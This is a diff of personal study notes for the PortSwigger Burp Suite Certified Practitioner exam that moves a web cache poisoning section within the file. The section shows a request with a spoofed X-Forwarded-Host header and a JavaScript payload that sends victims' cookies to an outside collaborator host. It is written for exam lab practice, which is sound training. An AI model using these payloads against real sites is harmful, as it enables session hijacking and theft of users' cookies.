@@ -4,9 +4,9 @@
 >My study notes on the PortSwigger Academy [Burp Suite Certified Practitioner](https://portswigger.net/web-security/certification) (BSCP) Exam topics. The below BSCP notes may require going to PortSwigger Academy labs to understand my thinking in changing payloads to get require results needed to progress to next stage in exam.  
 
 **[Foothold](#foothold)**  
-[Dom-XSS](#dom-xss-messages)  
-[Web Cache Poison](#web-cache-poison)  
+[Dom-XSS](#dom-based-xss)  
 [Cross Site Scripting](#cross-site-scripting)  
+[Web Cache Poison](#web-cache-poison)  
 [Host Header Poison](#host-header-poison---forgot-password)  
 [HTTP Request Smuggling](#http-request-smuggling)  
   
@@ -154,45 +154,7 @@
   
 [PortSwigger: Identify DOM XSS using PortSwigger DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/web-messages)  
   
-## Web Cache Poison  
-
->Target use **tracking.js** JavaScript, and is vulnerable to **X-Forwarded-Host** header redirecting path, allowing the stealing of cookie by poisoning cache.  
-
-```html
-GET / HTTP/1.1
-Host: TARGET.web-security-academy.net
-X-Forwarded-Host: exploit-SERVER.exploit-server.net
-
-```  
-
-![tracking.js](images/tracking.js.png)  
-
->Hosting on the exploit server, injecting the **X-Forwarded-Host** header in request, and poison the cache until victim hits poison cache.  
-
-```
- /resources/js/tracking.js 
-```  
-  
-![exploit host tracking.js](images/exploit-host-tracking-js.png)  
-  
-```javascript
-document.location='https://collaboration.net/?cookies='+document.cookie;
-```  
-
->Keep **Poisoning** the web cache of target by resending request with **X-Forwarded-Host** header.  
-
-![x-cache-hit.png](images/x-cache-hit.png)  
-
-[PortSwigger Lab: Web cache poisoning with an unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)  
-
->Youtube video showing above lab payload on exploit server modified to steal victim cookie when victim hits a cached entry on backend server. The payload is the above JavaScript.  
-
-[YouTube: Web cache poisoning with unkeyed header - cookie stealer](https://youtu.be/eNmF8fq-ur8)  
-  
-  
-[Param Miner Extension to identify web cache vulnerabilities](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)  
-
-## Cross Site Scripting
+## Cross Site Scripting  
 
 >XSS Resources pages to lookup payloads for **tags** and **events**.   
 
@@ -401,7 +363,43 @@ body:document.cookie
 
 [PortSwigger Lab: Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)  
   
+## Web Cache Poison  
 
+>Target use **tracking.js** JavaScript, and is vulnerable to **X-Forwarded-Host** header redirecting path, allowing the stealing of cookie by poisoning cache.  
+
+```html
+GET / HTTP/1.1
+Host: TARGET.web-security-academy.net
+X-Forwarded-Host: exploit-SERVER.exploit-server.net
+
+```  
+
+![tracking.js](images/tracking.js.png)  
+
+>Hosting on the exploit server, injecting the **X-Forwarded-Host** header in request, and poison the cache until victim hits poison cache.  
+
+```
+ /resources/js/tracking.js 
+```  
+  
+![exploit host tracking.js](images/exploit-host-tracking-js.png)  
+  
+```javascript
+document.location='https://collaboration.net/?cookies='+document.cookie;
+```  
+
+>Keep **Poisoning** the web cache of target by resending request with **X-Forwarded-Host** header.  
+
+![x-cache-hit.png](images/x-cache-hit.png)  
+
+[PortSwigger Lab: Web cache poisoning with an unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)  
+
+>Youtube video showing above lab payload on exploit server modified to steal victim cookie when victim hits a cached entry on backend server. The payload is the above JavaScript.  
+
+[YouTube: Web cache poisoning with unkeyed header - cookie stealer](https://youtu.be/eNmF8fq-ur8)  
+  
+[Param Miner Extension to identify web cache vulnerabilities](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)  
+  
 ## Host Header Poison - forgot-password
 
 ### Spoof IP Address  
